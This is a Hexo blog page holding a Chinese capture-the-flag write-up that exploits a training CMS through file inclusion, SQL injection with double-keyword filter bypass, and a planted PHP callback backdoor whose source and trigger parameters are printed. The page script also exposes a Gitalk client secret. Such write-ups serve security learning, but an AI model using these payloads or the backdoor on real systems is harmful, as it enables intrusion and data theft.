@@ -1,0 +1,786 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next muse use-motion" lang="">
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="ctf,">
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="前言这两天在做南邮 ctf 平台的题，学到了不少新知识，拓展了一些思路。 刚做到了综合题2，做了蛮久，虽然不是很难，但感觉是挺有意思的一道题，于是准备写下我的第一篇writeup。 这道题涉及到 sql injection，文件包含，请求头以及回调后门，偏向于简单的渗透。 - 南邮CTF训练平台：https://cgctf.nuptsast.com/  - 题目地址：http://cms.nupt">
+<meta name="keywords" content="ctf">
+<meta property="og:type" content="article">
+<meta property="og:title" content="CG-CTF 综合题(2) writeup">
+<meta property="og:url" content="http://yoursite.com/2018/11/13/CG-CTF-综合题-2-writeup/index.html">
+<meta property="og:site_name" content="像风">
+<meta property="og:description" content="前言这两天在做南邮 ctf 平台的题，学到了不少新知识，拓展了一些思路。 刚做到了综合题2，做了蛮久，虽然不是很难，但感觉是挺有意思的一道题，于是准备写下我的第一篇writeup。 这道题涉及到 sql injection，文件包含，请求头以及回调后门，偏向于简单的渗透。 - 南邮CTF训练平台：https://cgctf.nuptsast.com/  - 题目地址：http://cms.nupt">
+<meta property="og:locale" content="default">
+<meta property="og:image" content="http://yoursite.com/2018/11/13/CG-CTF-综合题-2-writeup/1.jpg">
+<meta property="og:image" content="http://yoursite.com/2018/11/13/CG-CTF-综合题-2-writeup/2.jpg">
+<meta property="og:image" content="http://yoursite.com/2018/11/13/CG-CTF-综合题-2-writeup/3.jpg">
+<meta property="og:image" content="http://yoursite.com/2018/11/13/CG-CTF-综合题-2-writeup/4.jpg">
+<meta property="og:image" content="http://yoursite.com/2018/11/13/CG-CTF-综合题-2-writeup/5.jpg">
+<meta property="og:image" content="http://yoursite.com/2018/11/13/CG-CTF-综合题-2-writeup/6.jpg">
+<meta property="og:image" content="http://yoursite.com/2018/11/13/CG-CTF-综合题-2-writeup/7.jpg">
+<meta property="og:image" content="http://yoursite.com/2018/11/13/CG-CTF-综合题-2-writeup/8.jpg">
+<meta property="og:image" content="http://yoursite.com/2018/11/13/CG-CTF-综合题-2-writeup/9.jpg">
+<meta property="og:updated_time" content="2018-11-13T08:10:40.876Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="CG-CTF 综合题(2) writeup">
+<meta name="twitter:description" content="前言这两天在做南邮 ctf 平台的题，学到了不少新知识，拓展了一些思路。 刚做到了综合题2，做了蛮久，虽然不是很难，但感觉是挺有意思的一道题，于是准备写下我的第一篇writeup。 这道题涉及到 sql injection，文件包含，请求头以及回调后门，偏向于简单的渗透。 - 南邮CTF训练平台：https://cgctf.nuptsast.com/  - 题目地址：http://cms.nupt">
+<meta name="twitter:image" content="http://yoursite.com/2018/11/13/CG-CTF-综合题-2-writeup/1.jpg">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Muse',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: 'Author'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2018/11/13/CG-CTF-综合题-2-writeup/">
+
+
+
+
+
+  <title>CG-CTF 综合题(2) writeup | 像风</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope="" itemtype="http://schema.org/WebPage" lang="default">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope="" itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">像风</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+            
+            Home
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
+            
+            Tags
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
+            
+            Archives
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br>
+            
+            About
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/11/13/CG-CTF-综合题-2-writeup/">
+
+    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="xiangfengw">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/head.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="像风">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">CG-CTF 综合题(2) writeup</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-11-13T14:34:34+08:00">
+                2018-11-13
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>这两天在做南邮 ctf 平台的题，学到了不少新知识，拓展了一些思路。</p>
+<p>刚做到了综合题2，做了蛮久，虽然不是很难，但感觉是挺有意思的一道题，于是准备写下我的第一篇writeup。</p>
+<p>这道题涉及到 sql injection，文件包含，请求头以及回调后门，偏向于简单的渗透。</p>
+<p>- 南邮CTF训练平台：<a href="https://cgctf.nuptsast.com/" target="_blank" rel="noopener">https://cgctf.nuptsast.com/</a> </p>
+<p>- 题目地址：<a href="http://cms.nuptzj.cn/" target="_blank" rel="noopener">http://cms.nuptzj.cn/</a></p>
+<a id="more"></a>
+<h1 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h1><p>进入这道题发现是一个客户留言板，在想会不会是XSS，往下看有个链接 “本CMS说明”，点进去看看。</p>
+<img src="/2018/11/13/CG-CTF-综合题-2-writeup/1.jpg">
+<p>发现这个链接到了 <a href="http://cms.nuptzj.cn/about.php?file=index.php，有可能存在文件包含，用来读取提示文件的代码。" target="_blank" rel="noopener">http://cms.nuptzj.cn/about.php?file=index.php，有可能存在文件包含，用来读取提示文件的代码。</a></p>
+<p>这里，借用个把所有用到的文件下到本地的代码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import codecs</span><br><span class="line">from bs4 import BeautifulSoup</span><br><span class="line">url=&quot;http://cms.nuptzj.cn/about.php?file=&quot;</span><br><span class="line">file_list = [&quot;index.php&quot;,&quot;passencode.php&quot;,&quot;say.php&quot;,&quot;config.php&quot;,&quot;antixss.php&quot;,&quot;about.php&quot;,&quot;so.php&quot;,&quot;antiinject.php&quot;,&quot;xlcteam.php&quot;]</span><br><span class="line">for i in file_list:</span><br><span class="line">    res = requests.get(url+i)</span><br><span class="line">    print(&quot;dowload &quot;+i)</span><br><span class="line">    if res.status_code==200:</span><br><span class="line">        res.encoding=&quot;utf8&quot;</span><br><span class="line">    with codecs.open(i,&quot;w+&quot;,&quot;utf8&quot;) as handle:</span><br><span class="line">        print(&quot;done&quot;)</span><br><span class="line">        text = BeautifulSoup(res.text,&quot;lxml&quot;).text</span><br><span class="line">        handle.write(text)</span><br><span class="line">---------------------</span><br><span class="line">作者：mylyylmy</span><br><span class="line">来源：CSDN</span><br><span class="line">原文：https://blog.csdn.net/mylyylmy/article/details/79885143</span><br></pre></td></tr></table></figure>
+<p>其实也可以直接在网页看代码。</p>
+<p>还提示了数据库表结构，所以推测是用sql注入获取账号密码，那我们还要找到后台页面才行。</p>
+<p>先通过读源码获取信息</p>
+<p>从passencode.php看出将用户的密码存储为了ASCii码格式</p>
+<p>其他的提示php文件代码中也没发现什么，这时突然想起没有读这个about.php本身的代码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot; /&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">    $file = $_GET[&apos;file&apos;];</span><br><span class="line">    if ($file == &quot;&quot; || strstr($file, &apos;config.php&apos;))</span><br><span class="line">    &#123;</span><br><span class="line">        echo &quot;file参数不能为空！&quot;;exit();</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">       $cut = strchr($file, &quot;loginxlcteam&quot;);</span><br><span class="line">        if ($cut == false) &#123;</span><br><span class="line">          $data = file_get_contents($file);</span><br><span class="line">          $date = htmlspecialchars($data);</span><br><span class="line">          echo $date;&#125; else &#123;echo &quot;&lt;script&gt;alert(&apos;敏感目录，禁止查看！但是。。。&apos;)&lt;/script&gt;&quot;;</span><br><span class="line">       &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+<p>从中发现了敏感目录 loginxlcteam，看名字应该就是后台登陆页面了，直接打开</p>
+<img src="/2018/11/13/CG-CTF-综合题-2-writeup/2.jpg">
+<p>接下来要找sql注入的位置了，回到首页发现有个留言搜索(输入ID)的位置，应该会传参数，输入个1，点搜索到了这个页面</p>
+<img src="/2018/11/13/CG-CTF-综合题-2-writeup/3.jpg">
+<p>根据提示信息，应该是User-Agent头信息不满足</p>
+<p>用前文的文件包含看一下so.php的源码</p>
+<img src="/2018/11/13/CG-CTF-综合题-2-writeup/4.jpg">
+<p>发现了User-Agent头应该设置为 Xlcteam Browser，</p>
+<p>发现了构造的sql语句为<code>SELECT * FROM &#39;message&#39; WHERE display=1 AND id=$id</code></p>
+<p>且这个id使用post传递soid参数赋值的</p>
+<p>还发现了包含文件 ‘antiinject.php’ 看文件名应该是防sql注入的</p>
+<h1 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h1><p>通过上一步，我们搜集到了sql注入需要的一些信息，这里我们先看一下sql语句的过滤文件antiinject.php</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    function antiinject($content) &#123;</span><br><span class="line">    </span><br><span class="line">    $keyword = array(&quot;select&quot;, &quot;union&quot;, &quot;and&quot;, &quot;from&quot;, &apos; &apos;, &quot;&apos;&quot;, &quot;;&quot;, &apos;&quot;&apos;, &quot;char&quot;, &quot;or&quot;, &quot;count&quot;, &quot;master&quot;, &quot;name&quot;, &quot;pass&quot;, &quot;admin&quot;, &quot;+&quot;, &quot;-&quot;, &quot;order&quot;, &quot;=&quot;);</span><br><span class="line">    </span><br><span class="line">    $info = strtolower($content);</span><br><span class="line"></span><br><span class="line">    for ($i = 0; $i &lt;= count($keyword); $i++) &#123;</span><br><span class="line">        $info = str_replace($keyword[$i], &apos;&apos;, $info);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    return $info;</span><br><span class="line">    &#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>发现过滤了一些敏感词汇，可以使用双重绕过：SELselectECT =&gt; SELECT</p>
+<p>空格也被过滤了，可以使用/**/代表空格</p>
+<p>在构造payload时可以使用也被过滤的 “=” 来截断需要使用的敏感词汇</p>
+<p>先用order by语句获知列数为4，构造语句查看回显情况</p>
+<p><code>soid=0/**/UNunionION/**/SELselectECT/**/1,2,3,4</code></p>
+<img src="/2018/11/13/CG-CTF-综合题-2-writeup/5.jpg">
+<p>构造payload <code>soid=0/**/UNunionION/**/SELselectECT/**/1,usernam=e,userpas=s,4/**/fro=m/**/admi=n</code></p>
+<img src="/2018/11/13/CG-CTF-综合题-2-writeup/6.jpg">
+<p>得到后台账户admin及它的ASCII码password <code>102 117 99 107 114 117 110 116 117</code></p>
+<p>解码得到后台登录密码</p>
+<p><code>fuckruntu</code></p>
+<h1 id="回调函数"><a href="#回调函数" class="headerlink" title="回调函数"></a>回调函数</h1><p>用拿到的账户密码登录后台发现还没有拿到flag，而是得到了新的信息，网站根目录下已经被上传了小马xlcteam.php</p>
+<img src="/2018/11/13/CG-CTF-综合题-2-writeup/7.jpg">
+<p>继续用开头的文件包含看源码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$e = $_REQUEST[&apos;www&apos;];</span><br><span class="line">$arr = array($_POST[&apos;wtf&apos;] =&gt; &apos;|.*|e&apos;,);</span><br><span class="line">array_walk($arr, $e, &apos;&apos;);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>这是个三参数数组回调后门</p>
+<p>回调后门利用了php中包含回调函数参数的函数 </p>
+<p>具体用法可以参考 phith0n师傅在乌云知识库中的文章 <a href="http://www.anquan.us/static/drops/tips-7279.html" target="_blank" rel="noopener">创造tips的秘籍——PHP回调后门</a></p>
+<p>在 p师傅 的文章中发现了类似的使用：</p>
+<img src="/2018/11/13/CG-CTF-综合题-2-writeup/8.jpg">
+<p>这里可以尝试做相同的传参操作</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?www=preg_replace</span><br><span class="line">wtf=phpinfo();</span><br></pre></td></tr></table></figure>
+<p>最后使用scandir() 函数列出当前目录下的文件名并打印</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?www=preg_replace</span><br><span class="line">wtf=print_r(scandir(&apos;.&apos;))</span><br></pre></td></tr></table></figure>
+<img src="/2018/11/13/CG-CTF-综合题-2-writeup/9.jpg">
+<p>得到flag文件名 “恭喜你获得flag2.txt”</p>
+<p>用文件包含读取这个文件得到flag！ </p>
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>之前做前面的题时没啥思路总爱看别人的writeup，自己做题时一头雾水，现在好像了解了一些简单的套路。</p>
+<p>这道题其实每一步都不是很难，只不过把多个思路结合到一起了，所以对我这种萌新而言蛮耗时间了。</p>
+<p>像sql注入那里双写就绕过了，也没有过滤逗号，看到一些师傅在博客上写了脚本，大家可以去参考一下。</p>
+<p>做前面的题时还学到了许多其他的知识，这两天做完剩下的几道题就总结一下。</p>
+<h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><ul>
+<li><a href="http://www.anquan.us/static/drops/tips-7279.html" target="_blank" rel="noopener">http://www.anquan.us/static/drops/tips-7279.html</a></li>
+<li><a href="http://www.zhzzhz.com/recorder/%E5%8D%97%E9%82%AEctf-%E7%BB%BC%E5%90%88%E9%A2%982-writeup.html" target="_blank" rel="noopener">http://www.zhzzhz.com/recorder/%E5%8D%97%E9%82%AEctf-%E7%BB%BC%E5%90%88%E9%A2%982-writeup.html</a></li>
+</ul>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/ctf/" rel="tag"># ctf</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2018/11/07/理解Java反序列化漏洞-1/" rel="next" title="理解Java反序列化漏洞(1)">
+                <i class="fa fa-chevron-left"></i> 理解Java反序列化漏洞(1)
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+  <div id="gitalk-container">
+  </div>
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Overview
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image" src="/images/head.jpg" alt="xiangfengw">
+            
+              <p class="site-author-name" itemprop="name">xiangfengw</p>
+              <p class="site-description motion-element" itemprop="description">陪你看千帆 陪你等风雨</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">5</span>
+                  <span class="site-state-item-name">posts</span>
+                </a>
+              </div>
+            
+
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">4</span>
+                  <span class="site-state-item-name">tags</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#前言"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#信息搜集"><span class="nav-number">2.</span> <span class="nav-text">信息搜集</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#SQL注入"><span class="nav-number">3.</span> <span class="nav-text">SQL注入</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#回调函数"><span class="nav-number">4.</span> <span class="nav-text">回调函数</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#总结"><span class="nav-number">5.</span> <span class="nav-text">总结</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Reference"><span class="nav-number">6.</span> <span class="nav-text">Reference</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2018</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">xiangfengw</span>
+
+  
+</div>
+
+
+  <div class="powered-by">Powered by <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a></div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">Theme &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Muse</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  <link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
+  <script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
+  <script src="https://cdn.bootcss.com/blueimp-md5/2.10.0/js/md5.min.js"></script>
+   <script type="text/javascript">
+        var gitalk = new Gitalk({
+          clientID: 'a577580d9583cf2d0777',
+          clientSecret: '5d26d41d6f828490c65bdd37e68234db18ad7d08',
+          repo: 'xiangfengwGitalk.github.io',
+          owner: 'xiangfengw',
+          admin: ['xiangfengw'],
+          id: md5(window.location.pathname),
+          distractionFreeMode: 'true'
+        })
+        gitalk.render('gitalk-container')
+       </script>
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
